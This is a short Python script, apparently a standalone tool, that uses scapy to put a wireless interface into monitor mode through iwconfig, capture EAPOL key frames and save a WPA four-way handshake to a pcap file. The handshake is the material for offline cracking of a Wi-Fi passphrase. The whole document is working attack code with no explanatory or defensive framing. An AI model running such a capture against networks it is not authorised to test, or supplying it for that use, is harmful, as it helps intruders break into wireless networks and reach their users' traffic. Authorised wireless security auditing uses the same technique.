from scapy.all import *
import os

iface = "wlp2s0"
iwconfig_cmd = "/usr/sbin/iwconfig"
wpa_handshake = []

def handle_packet(packet):
    global wpa_handshake
    # Got EAPOL KEY packet
    if packet.haslayer(EAPOL) and packet.type == 2:
        print(packet.summary())
        wpa_handshake.append(packet)
        # Got complete handshake? Dump it to pcap file
        if len(wpa_handshake) >= 4:
            wrpcap("wpa_handshake.pcap", wpa_handshake)
            print("WPA handshake captured successfully!")
            exit()

# Set device into monitor mode
os.system(iwconfig_cmd + " " + iface + " mode monitor")
# Start sniffing
print("Sniffing on interface " + iface)
sniff(iface=iface, prn=handle_packet)
